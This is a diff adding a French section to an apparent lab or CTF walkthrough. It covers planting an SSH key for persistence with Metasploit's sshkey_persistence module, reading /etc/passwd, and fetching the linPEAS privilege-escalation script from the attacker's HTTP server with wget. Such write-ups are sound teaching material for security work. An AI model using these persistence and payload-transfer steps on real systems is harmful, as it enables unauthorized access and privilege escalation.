@@ -263,4 +263,86 @@ meterpreter > getuid
 Server username: www-data (33)
 ```
 
+### Shell SSH
 
+En regardant le fichier __`/etc/passwd`__ :
+```
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+...
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+...
+```
+
+On voit que l'utilisateur www-data a un shell : `/bin/sh` et que son dossier est `/var/www`.
+
+On peut obtenir un meilleur shell en ajoutant une clé SSH au fichier `.ssh/authorized_key` dans le home (`/var/www`) de l'utilisateur `www-data`.
+
+Générer la clé SSH:
+    
+    ssh-keygen
+
+Notre clé se trouve dans /home/kali/.ssh/id_rsa.pub
+
+
+    use post/linux/manage/sshkey_persistence
+
+```bash
+msf6 post(linux/manage/sshkey_persistence) > options 
+
+Module options (post/linux/manage/sshkey_persistence):
+
+   Name             Current Setting       Required  Description
+   ----             ---------------       --------  -----------
+   CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
+   PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
+   SESSION                                yes       The session to run this module on.
+   SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
+   USERNAME                               no        User to add SSH key to (Default: all users on box
+
+msf6 post(linux/manage/sshkey_persistence) > set pubkey /home/kali/.ssh/id_rsa.pub
+pubkey => /home/kali/.ssh/id_rsa.pub
+
+msf6 post(linux/manage/sshkey_persistence) > set session 2
+session => 2
+
+msf6 post(linux/manage/sshkey_persistence) > run
+
+[*] Checking SSH Permissions
+[*] Authorized Keys File: .ssh/authorized_keys
+[*] Finding .ssh directories
+[*] Adding key to /var/www/.ssh/authorized_keys
+[+] Key Added
+[*] Post module execution completed
+```
+
+On peut maintenant se connecter en ssh à l'utilisateur __www-data__.
+
+```bash
+ssh www-data@192.168.56.6 
+```
+
+
+
+## Elévation de privilèges
+
+Un script d'audit bien pratique.
+
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
+
+
+On peut le transférer en http.
+
+Sur notre kali, se mettre dans le dossier du fichier à transférer.\
+Mettons `/opt/privilege-escalation-awesome-scripts-suite/linPEAS`.
+
+On peut lancer un petit serveur HTTP :
+```bash
+sudo python3 -m http.server 80
+```
+
+Sur la machine distante.
+```bash
+wget http://192.168.56.5/linpeas.sh
+```
